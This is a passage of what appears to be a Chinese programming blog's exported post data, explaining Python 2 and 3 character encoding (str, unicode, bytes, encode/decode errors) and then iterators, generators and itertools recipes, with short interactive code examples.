str 类型，于是 python 提供了 encode 方法，从 unicode 转换到 str，反之亦然。encode 123456&gt;&gt;&gt; u = u\"禅\"&gt;&gt;&gt; uu'\\u7985'&gt;&gt;&gt; s=u.encode(\"utf-8\")&gt;&gt;&gt; s'\\xe7\\xa6\\x85' decode 12&gt;&gt;&gt; s.decode(\"utf-8\")u'\\u7985 不少初学者怎么也记不住 str 与 unicode 之间的转换用 encode 还是 decode，如果你记住了 str 本质上其实是一串二进制数据，而 unicode 是字符（符号），编码（encode）就是把字符（符号）转换为 二进制数据的过程，因此 unicode 到 str 的转换要用 encode 方法，反过来就是用 decode 方法。 0x3.3UnicodeEncodeErrorUnicodeEncodeError 发生在 unicode 字符串转换成 str 字节序列的时候，来看一个例子，把一串 unicode 字符串保存到文件 123text=u'hello世界'f=open(\"output.txt\",\"w\")f.write(text) 错误日志 1UnicodeEncodeError: 'ascii' codec can't encode characters in position 5-6: ordinal not in range(128) 为什么会出现 UnicodeEncodeError？ 因为调用 write 方法时，Python 会先判断字符串是什么类型，如果是 str，就直接写入文件，不需要编码，因为 str 类型的字符串本身就是一串二进制的字节序列了。 如果字符串是 unicode 类型，那么它会先调用 encode 方法把 unicode 字符串转换成二进制形式的 str 类型，才保存到文件，而 encode 方法会使用 python 默认的 ascii 码来编码 相当于： 1u'hello世界'.encode(\"ascii\") 但是，我们知道 ASCII 字符集中只包含了128个拉丁字母，不包括中文字符，因此 出现了 ‘ascii’ codec can’t encode characters 的错误。要正确地使用 encode ，就必须指定一个包含了中文字符的字符集，比如：UTF-8、GBK。 12345&gt;&gt;&gt; u\"hello世界\".encode(\"utf-8\")'hello\\xe4\\xb8\\x96\\xe7\\x95\\x8c'&gt;&gt;&gt; u\"hello世界\".encode(\"gbk\")'hello\\xca\\xc0\\xbd\\xe7' 所以要把 unicode 字符串正确地写入文件，就应该预先把字符串进行 UTF-8 或 GBK 编码转换。 123text=u'hello世界'.encode('utf-8')f=open(\"output.txt\",\"w\")f.write(text) 当然，把 unicode 字符串正确地写入文件不止一种方式，但原理是一样的，这里不再介绍，把字符串写入数据库，传输到网络都是同样的原理 0x3.4UnicodeDecodeErrorUnicodeDecodeError 发生在 str 类型的字节序列解码成 unicode 类型的字符串时 12345678910&gt;&gt;&gt; a = u\"禅\"&gt;&gt;&gt; au'\\u7985'&gt;&gt;&gt; b = a.encode(\"utf-8\")&gt;&gt;&gt; b'\\xe7\\xa6\\x85'&gt;&gt;&gt; b.decode(\"gbk\")Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'gbk' codec can't decode byte 0x85 in position 2: incomplete multibyte sequence 把一个经过 UTF-8 编码后生成的字节序列 ‘\\xe7\\xa6\\x85’ 再用 GBK 解码转换成 unicode 字符串时，出现 UnicodeDecodeError，因为 （对于中文字符）GBK 编码只占用两个字节，而 UTF-8 占用3个字节，用 GBK 转换时，还多出一个字节，因此它没法解析。避免 UnicodeDecodeError 的关键是保持 编码和解码时用的编码类型一致。 这也回答了文章开头说的字符 “禅”，保存到文件中有可能占3个字节，有可能占2个字节，具体处决于 encode 的时候指定的编码格式是什么。再举一个 UnicodeDecodeError 的例子 123456&gt;&gt;&gt; x=u\"hello\"&gt;&gt;&gt; y=\"世界\"&gt;&gt;&gt; x+yTraceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'ascii' codec can't decode byte 0xca in position 0: ordinal not in range(128) str 与 unicode 字符串 执行 + 操作时，Python 会把 str 类型的字节序列隐式地转换成（解码）成 和 x 一样的 unicode 类型，但Python是使用默认的 ascii 编码来转换的，而 ASCII字符集中不包含有中文，所以报错了。相当于： 1234&gt;&gt;&gt; y.decode('ascii')Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;UnicodeDecodeError: 'ascii' codec can't decode byte 0xca in position 0: ordinal not in range(128) 正确地方式应该是找到一种包含有中文字符的字符编码，比如 UTF-8或者 GBK 显示地把 y 进行解码转换成 unicode 类型 0x4python3的编码Python3 把系统默认编码设置为 UTF-8 1234&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.getdefaultencoding()'utf-8'&gt;&gt;&gt; 然后，文本字符和二进制数据区分得更清晰，分别用 str 和 bytes 表示。文本字符全部用 str 类型表示，str 能表示 Unicode 字符集中所有字符，而二进制字节数据用一种全新的数据类型，用 bytes 来表示。 0x4.1str与bytestr 1234567891011&gt;&gt;&gt; a=\"a\"&gt;&gt;&gt; a'a'&gt;&gt;&gt; type(a)&lt;class 'str'&gt;&gt;&gt;&gt; b=\"是\"&gt;&gt;&gt; b'是'&gt;&gt;&gt; type(b)&lt;class 'str'&gt;&gt;&gt;&gt; bytePython3 中，在字符引号前加‘b’，明确表示这是一个 bytes 类型的对象，实际上它就是一组二进制字节序列组成的数据，bytes 类型可以是 ASCII范围内的字符和其它十六进制形式的字符数据，但不能用中文等非ASCII字符表示。 12345678910111213141516&gt;&gt;&gt; c=b'a'&gt;&gt;&gt; cb'a'&gt;&gt;&gt; type(c)&lt;class 'bytes'&gt;&gt;&gt;&gt; d = b'\\xe7\\xa6\\x85'&gt;&gt;&gt; db'\\xe7\\xa6\\x85'&gt;&gt;&gt; type(d)&lt;class 'bytes'&gt;&gt;&gt;&gt; e=b'是' File \"&lt;stdin&gt;\", line 1SyntaxError: bytes can only contain ASCII literal characters.&gt;&gt;&gt; bytes 类型提供的操作和 str 一样，支持分片、索引、基本数值运算等操作。但是 str 与 bytes 类型的数据不能执行 + 操作，尽管在py2中是可行的。 12345678910111213&gt;&gt;&gt; b\"a\"+b\"c\"b'ac'&gt;&gt;&gt; b\"a\"*2b'aa'&gt;&gt;&gt; b\"abcdef\\xd6\"[1:]b'bcdef\\xd6'&gt;&gt;&gt; b\"abcdef\\xd6\"[-1]214&gt;&gt;&gt; b\"a\" + \"b\"Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: can't concat bytes to str 0x4.2encode 与 decodestr 与 bytes 之间的转换可以用 encode 和从decode 方法。encode 负责字符到字节的编码转换。默认使用 UTF-8 编码准换。 123456&gt;&gt;&gt; s=\"hello世界\"&gt;&gt;&gt; s.encode()b'hello\\xe4\\xb8\\x96\\xe7\\x95\\x8c'&gt;&gt;&gt; s.encode('gbk')b'hello\\xca\\xc0\\xbd\\xe7'&gt;&gt;&gt; decode 负责字节到字符的解码转换，通用使用 UTF-8 编码格式进行转换。 12345&gt;&gt;&gt; b'hello\\xe4\\xb8\\x96\\xe7\\x95\\x8c'.decode()'hello世界'&gt;&gt;&gt; b'hello\\xca\\xc0\\xbd\\xe7'.decode('gbk')'hello世界' 0x5python2与python3的区别0x5.1encode和decode encode（编码）：Unicode ==&gt; utf-8或者gbk（字节流） decode（解码）：utf-8或者gbk（字节流） ==&gt; Unicode 一个是编，一个是解，怎么样才能比较好记忆和理解呢？我是这么认为的，‘utf-8’或者‘gbk’是具体的编码格式，所以这两个要‘解（decode）’，解完之后就成了Unicode，它好比一种中间编码的状态（仅仅为了好理解），虚无定型，这个时候就可以指定一种具体的格式进行‘编（encode）’。 流程是这样的：UTF-8（解码）–&gt; Unicode –&gt;（编码） GBK 0x5.2python 2和3中‘str’类型的本质区别在理解为什么python 3.x就解决了乱码这个问题之前，我们首先要知道一个事实，python 2和python 3的str是有本质区别的。 在python 2中的str是“某种具体的编码格式”，比如‘utf-8’，‘gbk’，‘ascii’，它本身存储的就是字节码（bytes），虽然在读取的时候比较方便，但是比较局限，如果要从gbk到utf-8，就得先转换成 Unicode。 123&gt;&gt;&gt; s=\"你好世界\"&gt;&gt;&gt; s'\\xc4\\xe3\\xba\\xc3\\xca\\xc0\\xbd\\xe7' python 3的str格式定义变更为”Unicode类型的字符串“，在默认情况下，被引号框起来的字符串，本质是使用Unicode编码的。也就是说python3中的str就相当于python2中的unicode。一种可以理解为万金油的格式，作为一种中间编码，不管是要到gbk或者utf-8，都非常方便。 0x5.3python 2和3中‘str’类型的表现形式区别字符串解码（转成Unicode） python 2的字符串有两种解码方式： ① 使用decode(编码格式)：可以指定字符编码 ② 在字符串前面加‘u’：不能指定字符编码，使用默认编码方式来解码 12345678 #① 第一种解码方式 &gt;&gt;&gt; s=\"你好世界\" &gt;&gt;&gt; s.decode('gbk') u'\\u4f60\\u597d\\u4e16\\u754c' #② 第二种解码方式 &gt;&gt;&gt; u\"你好世界\"u'\\u4f60\\u597d\\u4e16\\u754c' Python 3的字符串不能直接解码，因为前面说过了，Python 3的str本质就是Unicode，我已经是Unicode格式了，还需要解码么？所以在Python 3中，字符串是没有decode方法的。 0x5.4encode和decode的使用场景 前面有说到，为了节约空间资源，在网络传输或者写入磁盘的时候，最终会编码为‘utf-8’或者‘gbk’格式的字节码， 在Python 2中，因为Python 2的内存数据直接就是已经编码的字节码，所以不需要进行encode或者decode，可以直接读取。 在Python 3中，从网络或磁盘接收到的数据是已经编码的字节码（utf-8’或‘gbk’），而Python需要根据格式进行解码（decode）成Unicode格式，相反如果想从内存、磁盘或者网络中写入数据，python 3要先进行编码（encode），一句话总结：接收解码，发送编码。 为了便于记忆，下面简易的画了个图帮助理解。 0x5.5字符编码使用 在python 2中，默认使用ASCII编码，所以如果你的代码出现中文，妥妥的报SyntaxError，因为ASCII不认识中文 所以在python 2中为了解决中文问题，都会在源文件的头部加上以下信息： 12#!/usr/bin/env python3# -*- coding: utf-8 -*- 或者 #coding=utf-8 第一行注释：为了告诉Linux/OS X系统，这是一个Python可执行程序， Windows系统会忽略这个注释； 第二行注释：为了告诉Python解释器，按照UTF-8编码去处理字符串。 python 3在python 3中，默认使用‘utf-8’编码，所以在编写python 3代码时，如果要支持中文字符串的处理，终于不需要手动指定编码格式。 0x5.6python2 与 python3 字节与字符的对应关系 python2 python3 表现 转换 作用 str bytes 字节 encode 存储 unicode str 字符 decode 显示 0x6实例演示 到此为止，你以为就结束了么？非也非也，你以为在Python 2中配置了‘utf-8’,或者直接使用python 3就一定不会出现乱码问题了么？答案肯定不是，如果不注意，仍然会出现乱码。 ① 我们下面在windows的CMD来做一个小示例： 在python 3.7中执行脚本，脚本只有一条语句：print(‘科比’)，按理来说，python 3.7肯定是支持中文的啦，为什么还是会报错？ 因为我们这里设了一个小小的坑，我的test.py源代码脚本的保存格式是‘GBK’的，所以当python解释器拿到这个字符串（GBK格式），然后用‘utf-8’去decode成Unicode这个过程当然会有问题，所以直接报错了。 所以最终，我们的源代码脚本的编码格式和设置的编码格式要保证一致。 ② 到这里还没完，对，就是没完没了了。下面再看一个示例：咦，不对啊，我‘utf-8’也申明了，源代码文件格式也是‘utf-8’了，为什么还给我打印乱码? 首先，我们要知道运行这个脚本，打印中文“科比”这条语句是涉及到了两个角色的，一个自然就是我们的python解释器，一个是我们的控制台，在windows是cmd，linux是shell，python要打印字符串，会调用控制台进行显示的，所以会把要显示的字符串数据传给控制台。 知道有这么个隐藏的动作，就好理解为什么会打印出乱码了？如果我前面的讲解你都能懂的话，你应该能猜到了，首先，我是在python 2中打印这条语句，我虽然设置了默认编码格式为‘utf-8’，然后编码成字节码（utf-8格式）传送给我们的控制台cmd，而cmd拿到这串数据，用‘gbk’去解码，注意，这里就是产生乱码的原因！ windows的cmd是‘gbk’编码格式的，而我们的字符串是‘utf-8’格式的，所以产生了乱码。 如果你把这个脚本文件拿到linux上去运行，正常打印，因为我们linux的shell是‘utf-8’的！当然在windows用python 3去运行这个脚本，也没有问题，为什么？因为python 3的str是Unicode类型的，cmd拿到就可以直接编码成‘gbk’格式的。 参考文章:字符编码详解：https://www.xjimmy.com/python-6-code.htmlPython 编码为什么那么蛋疼？ https://foofish.net/why-python-encoding-is-tricky.htmlPython3 是如何解决棘手的字符编码问题的？ https://foofish.net/how-python3-handle-charset-encoding.html","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"编码","slug":"编码","permalink":"https://blog.cfyqy.com/tags/%E7%BC%96%E7%A0%81/"}],"author":"ye1s"},{"title":"python的迭代器和生成器","slug":"thon的迭代器和生成器","date":"2019-05-28T11:38:00.000Z","updated":"2020-04-13T08:23:59.022Z","comments":true,"path":"article/71e41d0d.html","link":"","permalink":"https://blog.cfyqy.com/article/71e41d0d.html","excerpt":"容器(container)、可迭代对象(iterable)、迭代器(iterator)、生成器(generator)、列表/集合/字典推导式(list,set,dict comprehension)众多概念,有点复杂，整理一下。","text":"容器(container)、可迭代对象(iterable)、迭代器(iterator)、生成器(generator)、列表/集合/字典推导式(list,set,dict comprehension)众多概念,有点复杂，整理一下。 详情可以看一篇文章:https://foofish.net/iterators-vs-generators.ht 0x1容器(container)容器是一种把多个元素组织在一起的数据结构，容器中的元素可以逐个地迭代获取，可以用in, not in关键字判断元素是否包含在容器中。通常这类数据结构把所有的元素存储在内存中（也有一些特例，并不是所有的元素都放在内存，比如迭代器和生成器对象）在Python中，常见的容器对象有： 12345list, deque, ....set, frozensets, ....dict, defaultdict, OrderedDict, Counter, ....tuple, namedtuple, …str 容器比较容易理解，因为你就可以把它看作是一个盒子、一栋房子、一个柜子，里面可以塞任何东西。从技术角度来说，当它可以用来询问某个元素是否包含在其中时，那么这个对象就可以认为是一个容器，比如 list，set，tuples都是容器对象： 12345&gt;&gt;&gt; 4 not in [1, 2, 3]True&gt;&gt;&gt; 1 in [1, 2, 3]True&gt;&gt;&gt; 尽管绝大多数容器都提供了某种方式来获取其中的每一个元素，但这并不是容器本身提供的能力，而是可迭代对象赋予了容器这种能力，当然并不是所有的容器都是可迭代的，比如：Bloom filter，虽然Bloom filter可以用来检测某个元素是否包含在容器中，但是并不能从容器中获取其中的每一个值，因为Bloom filter压根就没把元素存储在容器中，而是通过一个散列函数映射成一个值保存在数组中。 0x2可迭代对象(iterable)0x2.1可迭代对象的理解 迭代器协议是指：对象需要提供next方法，它要么返回迭代中的下一项，要么就引起一个StopIteration异常，以终止迭代可迭代对象就是：实现了迭代器协议的对象协议是一种约定，可迭代对象实现迭代器协议，Python的内置工具(如for循环，sum，min，max函数等)使用迭代器协议访问对象。举个例子理解一下: 12345678910111213&gt;&gt;&gt; x = [1, 2, 3]&gt;&gt;&gt; y = iter(x)&gt;&gt;&gt; z = iter(x)&gt;&gt;&gt; next(y)1&gt;&gt;&gt; next(y)2&gt;&gt;&gt; next(z)1&gt;&gt;&gt; type(x)&lt;class 'list'&gt;&gt;&gt;&gt; type(y)&lt;class 'list_iterator'&gt; 这里x是一个可迭代对象，可迭代对象和容器一样是一种通俗的叫法，并不是指某种具体的数据类型，list是可迭代对象，dict是可迭代对象，set也是可迭代对象。y和z是两个独立的迭代器，迭代器内部持有一个状态，该状态用于记录当前迭代所在的位置，以方便下次迭代的时候获取正确的元素。迭代器有一种具体的迭代器类型，比如list_iterator，set_iterator。可迭代对象实现了iter方法，该方法返回一个迭代器对象。当运行代码： 123x = [1, 2, 3]for elem in x: ... 实际执行情况是：反编译该段代码，你可以看到解释器显示地调用GET_ITER指令，相当于调用iter(x)，FOR_ITER指令就是调用next()方法，不断地获取迭代器中的下一个元素，但是你没法直接从指令中看出来，因为他被解释器优化过了。 123456789101112&gt;&gt;&gt; import dis&gt;&gt;&gt; x=[1,2,3]&gt;&gt;&gt; dis.dis('for _ in x:pass') 1 0 SETUP_LOOP 12 (to 14) 2 LOAD_NAME 0 (x) 4 GET_ITER &gt;&gt; 6 FOR_ITER 4 (to 12) 8 STORE_NAME 1 (_) 10 JUMP_ABSOLUTE 6 &gt;&gt; 12 POP_BLOCK &gt;&gt; 14 LOAD_CONST 0 (None) 16 RETURN_VALUE 0x2.2 可迭代对象的判断可以直接作用于for循环的数据类型有以下几种：一类是集合数据类型，如list、tuple、dict、set、str等；一类是generator，包括生成器和带yield的generator function。这些可以直接作用于for循环的对象统称为可迭代对象：Iterable。可以使用isinstance()判断一个对象是否是Iterable对象： 1234567891011&gt;&gt;&gt; from collections import Iterable&gt;&gt;&gt; isinstance([], Iterable)True&gt;&gt;&gt; isinstance(&#123;&#125;, Iterable)True&gt;&gt;&gt; isinstance('abc', Iterable)True&gt;&gt;&gt; isinstance((x for x in range(10)), Iterable)True&gt;&gt;&gt; isinstance(100, Iterable)False 0x3迭代器0x3.1迭代器的概念实现了__iter__和__next__方法的对象都称为迭代器。迭代器是一个有状态的对象，在调用next() 的时候返回下一个值，如果容器中没有更多元素了，则抛出StopIteration异常所以，迭代器就是实现了工厂模式的对象，它在你每次你询问要下一个值的时候给你返回。0x3.2迭代器的特点迭代是Python最强大的功能之一，是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。 迭代器只能往前不会后退。迭代器有两个基本的方法：iter() 和 next()。0x3.3迭代器的例子有很多关于迭代器的例子，比如itertools函数返回的都是迭代器对象。生成无限序列： 123456&gt;&gt;&gt; from itertools import count&gt;&gt;&gt; counter = count(start=13)&gt;&gt;&gt; next(counter)13&gt;&gt;&gt; next(counter)14 从一个有限序列中生成无限序列： 12345678910&gt;&gt;&gt; from itertools import cycle&gt;&gt;&gt; colors = cycle(['red', 'white', 'blue'])&gt;&gt;&gt; next(colors)'red'&gt;&gt;&gt; next(colors)'white'&gt;&gt;&gt; next(colors)'blue'&gt;&gt;&gt; next(colors)'red' 从无限的序列中生成有限序列： 123456789&gt;&gt;&gt; from itertools import islice&gt;&gt;&gt; colors = cycle(['red', 'white', 'blue']) # infinite&gt;&gt;&gt; limited = islice(colors, 0, 4) # finite&gt;&gt;&gt; for x in limited: ... print(x)redwhitebluered 0x3.4迭代器的创建把一个类作为一个迭代器使用需要在类中实现两个方法 iter() 与 next() 。__iter__() :方法返回一个特殊的迭代器对象， 这个迭代器对象实现了 __next__() 方法并通过 StopIteration 异常标识迭代的完成。__next__() :方法（Python 2 里是 next()）会返回下一个迭代器对象。 123456789101112131415161718192021from itertools import isliceclass Fib: def __init__(self): self.prev = 0 self.curr = 1 def __iter__(self): return self def __next__(self): value = self.curr self.curr += self.prev self.prev = value return valuef=Fib()print(list(islice(f,0,10)))output:[1, 1, 2, 3, 5, 8, 13, 21, 34, 55][Finished in 0.2s] Fib既是一个可迭代对象（因为它实现了iter方法），又是一个迭代器（因为实现了next方法）。实例变量prev和curr用户维护迭代器内部的状态。每次调用next()方法的时候做两件事： 为下一次调用next()方法修改状态为当前这次调用生成返回结果 迭代器就像一个懒加载的工厂，等到有人需要的时候才给它生成值返回，没调用的时候就处于休眠状态等待下一次调用。0x3.5StopIterationStopIteration 异常用于标识迭代的完成，防止出现无限循环的情况，在 next() 方法中我们可以设置在完成指定循环次数后触发 StopIteration 异常来结束迭代。斐波那契数列范例： 1234567891011121314151617class MyNumbers: def __iter__(self): self.a = 1 return self def __next__(self): if self.a &lt;= 21: x = self.a self.a += 1 return x else: raise StopIterationmyclass = MyNumbers()myiter = iter(myclass)for x in myiter: print(x) 0x4生成器0x4.1生成器的概念以及范例生成器其实是一种特殊的迭代器，但是不需要像迭代器一样实现iter和next方法，只需要使用关键字yield就可以。在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。 调用一个生成器函数，返回的是一个迭代器对象斐波那契数列例子: 123456789def fib(): prev, curr = 0, 1 while True: yield curr prev, curr = curr, curr + prev&gt;&gt;&gt; f = fib()&gt;&gt;&gt; list(islice(f, 0, 10))[1, 1, 2, 3, 5, 8, 13, 21, 34, 55] fib就是一个普通的python函数，它特殊的地方在于函数体中没有return关键字，函数的返回值是一个生成器对象。当执行f=fib()返回的是一个生成器对象，此时函数体中的代码并不会执行，只有显示或隐示地调用next的时候才会真正执行里面的代码。生成器在Python中是一个非常强大的编程结构，可以用更少地中间变量写流式代码，此外，相比其它容器对象它更能节省内存和CPU，当然它可以用更少的代码来实现相似的功能。现在就可以动手重构你的代码了，但凡看到类似： 12345def something(): result = [] for ... in ...: result.append(x) return result 都可以用生成器函数来替换： 123def iter_something(): for ... in ...: yield x 0x4.2生成器表达式生成器表达式是列表推倒式的生成器版本，看起来像列表推导式，但是它返回的是一个生成器对象而不是列表对象。 12345&gt;&gt;&gt; a = (x*x for x in range(10))&gt;&gt;&gt; a&lt;generator object &lt;genexpr&gt; at 0x401f08&gt;&gt;&gt;&gt; sum(a)285 0x5 迭代器的问题与解法(扩展)0x5.1手动访问迭代器中的元素问题:在处理某个可迭代对象中的元素，因为某些原因，不能也不想使用for循环。解决方案:使用next()函数。例子: 1234567with open('h://flag.txt','r') as f: try: while True: line=next(f) print(line,end='') except StopIteration: pass 如果是手动使用next(),也可以命令它返回一个结束值，比如说None示例如下： 123456with open('h://flag.txt','r') as f: while True: line=next(f,None) if line is None: break print(line,end='') 0x5.2委托迭代问题:我们构建了一个自定义的容器对象，其内部持有一个列表、元组或其他的可迭代对象。我们想让自己的容器能够完成迭代操作。解决方案:一般来说，我们所要做的就是定义一个__iter__()方法,将迭代请求委托到对象内部持有的容器上。 1234567891011121314151617181920212223class Node(): def __init__(self,value): self._value=value self._children=[] def __repr__(self):#这个函数就是在打印类的时候，控制类输出的字符串相当于java中的toString() return 'Node(&#123;&#125;)'.format(self._value) def add_child(self,node): self._children.append(node) def __iter__(self): return iter(self._children)if __name__=='__main__': root=Node(0) child1=Node(1) child2=Node(2) root.add_child(child1) root.add_child(child2) for ch in root: print(ch)output:Node(1)Node(2)[Finished in 0.2s] 在这个例子中，__iter__方法只是简单地将迭代请求转发 给对象内部持有 的_childer属相上。iter(s)通过调用 s.__iter__()来简单的返回底层迭代器。 0x5.3用生成器来创建新的迭代模式问题：我们向自定义一个迭代模式，使其区别于常见的内建函数(即range(),reversed()等)解决方法:可使用生成器函数来定义 12345678910111213141516def frange(start,stop,increment): x=start while x&lt;stop: yield x x+=incrementfor n in frange(0,2,0.4): print(n)output:00.40.81.20000000000000021.6#主要还是因浮点数在计算机中实际是以二进制保存的，有些数不精确 0x5.4实现迭代协议问题:我们正在构建一个自定义的对象，希望它可以支持迭代操作，但是也希望有一种简单的方式来实现迭代协议。解决方案:目前来看，要在对象上实现可迭代功能，最简单的方式就是使用生成器函数。范例:实现一个迭代器能够以深度优先的模式遍历树的节点 12345678910111213141516171819202122232425262728293031323334class Node(object): def __init__(self, value): self._value = value self._children =[] def __repr__(self): return \"Node&#123;!r&#125;\".format(self._value) def __iter__(self): return iter(self._children) def add_child(self, node): return self._children.append(node) def depth_first(self): yield self for c in self: #下面的代码相当于yield from c.depth_first() for items in c.depth_first(): yield itemsif __name__ == '__main__': root = Node(0) child1 = Node(1) child2 = Node(2) root.add_child(child1) root.add_child(child2) child1.add_child(Node(3)) child2.add_child(Node(4)) child1.add_child(Node(5)) for ch in root.depth_first(): print(ch) 0x5.5反向迭代问题：我们想要反向迭代序列中的元素解决方案:可以使用内建的reversed()函数实现反向迭代 123a=[1,2,3,4]for x in reversed(a): print(x) 反向迭代的条件:只有在待处理的对象有用可确定的大小，或者对象实现了__reversed__()特殊方法时,才能奏效。如果这两个条件都无法满足，则必须首先将这个对象转化为列表。 可以在自定义的类上实现__reversed__()方法，实现反向迭代例如: 12345678910111213141516171819202122class Countdown(object): def __init__(self, start): self.start = start def __iter__(self): n = self.start while n &gt; 0: yield n n -= 1 def __reversed__(self): n = 1 while n &lt;= self.start: yield n n += 1if __name__ == '__main__': for rr in reversed(Countdown(30)): print(rr) for rr in Countdown(30): print(rr) 0x5.6定义带有额外状态的生成器函数问题：我们想要定义一个生成器函数，但是它涉及一些额外的状态，我们希望能以某种形式将这些状态暴露给用户。解决方案:如果想让生成器将状态暴露给用户，别忘了可以轻易地将其实现为一个类，然后生成器函数的代码放到__iter__()方法中。 1234567891011121314151617181920from collections import dequeclass LineHistory: def __init__(self, lines, hislen=3): self.lines = lines self.history = deque(maxlen=hislen) def __iter__(self): for lineno, line in enumerate(self.lines, 1): self.history.append((lineno, line)) yield line def clear(self): self.history.clear()with open('h://flag.txt','r') as f: lines=LineHistory(f) for line in lines: if 'hello' in line: for lineno,hline in lines.history: print('&#123;&#125;:&#123;&#125;'.format(lineno,hline,end='')) 0x5.7对迭代器做切片操作问题：我们相对迭代器产生的数据做切片处理，但是普通的切片操作符在这里不管用。解决方案:要对迭代器和生成器做切片操作，itertools.islice()函数是完美的选择。 123456789import itertoolsdef count(n): while True: yield n n += 1c = count(0)# c[10:20] &gt;&gt;&gt;TypeError: 'generator' object has no attribute '__getitem__'for items in itertools.islice(c, 10, 21): print(items) 函数 islice() 返回一个可以生成指定元素的迭代器,它通过遍历并丢弃直到切片开始索引位置的所有元素。然后才开始一个个的返回元素,并直到切片结束索引位置。缺点不能重复使用迭代器里面的数据 0x5.8跳过不需要的迭代部分使用itertools.dropwhile()函数实现范例: 1234from itertools import dropwhilewith open('h://flag.txt','r') as f: for line in dropwhile(lambda line: line.startswith(\"h\"), f): print(line,end='') 0x5.9迭代所有可能的组合或排列itertools.permutaions() 接受一个元素集合，将其中所有的元素重排列为所有可能的情况，并以元组序列的形式返回itertools.conbiations()可产生输入序列中所有元素的全部组合形式 12345678910from itertools import permutations,combinations, combinations_with_replacementitems = ['a', 'b', 'c']for c in permutations(items): # 排列A33 print(c)for c in permutations(items, 2): # 排列A33 print(c)for c in combinations(items, 3): # 组合 C23 print(c)for c in combinations_with_replacement(items, 3): # 同一元素重复使用 3*3*3 print(c) 0x5.10以索引-值对的形式迭代序列内建的enumerate()函数解决 123my_list = ['a', 'b', 'c']for idx, val in enumerate(my_list, 1):print(idx, val) zip(a,b)的工作原理是创建出一个迭代器，该迭代器可产生出元组(x,y),这里的x取自序列啊，而y取自序列b。 0x5.11同时迭代多个序列使用zip()函数来同时迭代多个序列 1234567891011a = [1, 2, 3]b = ['w', 'x', 'y', 'z']for i in zip(a,b): print(i)output:(1, 'w')(2, 'x')(3, 'y')[Finished in 0.2s] 打包字典。变成序列。 12345headers = ['name', 'shares', 'price']values = ['ACME', 100, 490.1]s = dict(zip(headers,values))print(s)list(zip(headers, values)) 0x5.12 在不同容器中进行迭代itetools.chain()可接受一个或多个可迭代对象作为参数，然后它会创建一个迭代器，该迭代器可连续访问你提供的每个可迭代对象中的元素。 12345from itertools import chaina = (1, 2, 3, 4)b = ['x', 'y', 'z']for x in chain(a, b): print(x) 0x5.13扁平化处理嵌套型序列123456789101112from collections import Iterabledef flatten(items, ignore_types=(str, bytes)): for x in items: #isinstance(x, Iterable) 判断是否可以迭代 ，可以则继续递归 #not isinstance(x, ignore_types)，排除字符串，字节，这两者也可以迭代 if isinstance(x, Iterable) and not isinstance(x, ignore_types): yield from flatten(x) else: yield xitems1 = [1, 2, [3, 4, [5, 6], 7], 8]for x in flatten(items1): print(x) 0x5.14合并多个有序序列再迭代heapq.merge()heapq.merge 生成器迭代特性意味着它不会立马读取所有序列。这就意味着你可以在非常长的序列中使用它,而不会有太大的开销 1234import heapqa = [1, 4, 7, 10]b = [2, 5, 6, 11]l = [x for x in heapq.merge(a, b)] 0x5.15迭代器代替while循环其实就是用遍历代替while.途径:iter(functiong, status)能够迭代常见的IO程序,伪代码 12345678910111213141516CHUNKSIZE = 8192def reader(s): while True: data = s.recv(CHUNKSIZE) if data == b'': break process_data(data) f = open(\"views.py\", \"r\")reader(f) #用iter()循环代替def reader2(s): for chunk in iter(lambda : s.recv(CHUNKSIZE),b\"\"): pass #process_data(data) 实例代码 1234import sysf = open(\"views.py\",\"r\")for chunk in iter(lambda: f.read(10), \"\"): n = sys.stdout.write(chunk) 作者：brother阿张链接：https://www.jianshu.com/p/083cb153c623来源：简书简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。参考文章:完全理解Python迭代对象、迭代器、生成器 https://foofish.net/iterators-vs-generators.html廖雪峰的官方网站https://www.liaoxuefeng.com/wiki/1016959663602400/1017323698112640如何更好地理解Python迭代器和生成器？ https://www.zhihu.com/question/20829330pythoncookbook 第4章 生成器与迭代器https://www.jianshu.com/p/083cb153c623","categories":[{"name":"编程算法","slug":"编程算法","permalink":"https://blog.cfyqy.com/categories/%E7%BC%96%E7%A8%8B%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.cfyqy.com/tags/python/"},{"name":"迭代器","slug":"迭代器","permalink":"https://blog.cfyqy.com/tags/%E8%BF%AD%E4%BB%A3%E5%99%A8/"},{"name":"生成器","slug":"生成器","permalink":"https://blog.cfyqy.com/tags/%E7%94%9F%E6%88%90%E5%99%A8/"}],"author":"ye1s"},{"title":"python的常见数据类型","slug":"thon的常见数据类型","date":"2019-05-28T04:49:00.000Z","updated":"2020-04-13T08:22:22.425Z","comments":true,"path":"article/86b11e8e.html","link":"","permalink":"https://blog.cfyqy.com/article/86b11e8e.html","excerpt":"python所学的知识还是太零碎了，准备花点时间整理一下知识点。就此开篇吧。","text":"python所学的知识还是太零碎了，准备花点时间整理一下知识点。就此开篇吧。 python中的标准数据类型有: 123456Number（数字）String（字符串）List（列表）Tuple（元组）Set（集合）Dictionary（字典） 不可变数据（3 个）：Number（数字）、String（字符串）、Tuple（元组）可变数据（3 个）：List（列表）、Dictionary（字典）、Set（集合） 0x1Number（数字）0x1.1数字类型的用处数字数据类型用于存储数值。0x1.2数字类型的创建与删除他们是不可改变的数据类型，这意味着改变数字数据类型会分配一个新的对象。 当你指定一个值时，Number对象就会被创建： 12var1 = 1var2 = 2 del语句删除一些对象的引用，其语法是： 1del var1[,var2[,var3[....,varN]]]] 通过使用del语句可以删除单个或多个对象的引用。例如： 12del var1del var1, var2 0x1.3四种不同的数字类型： 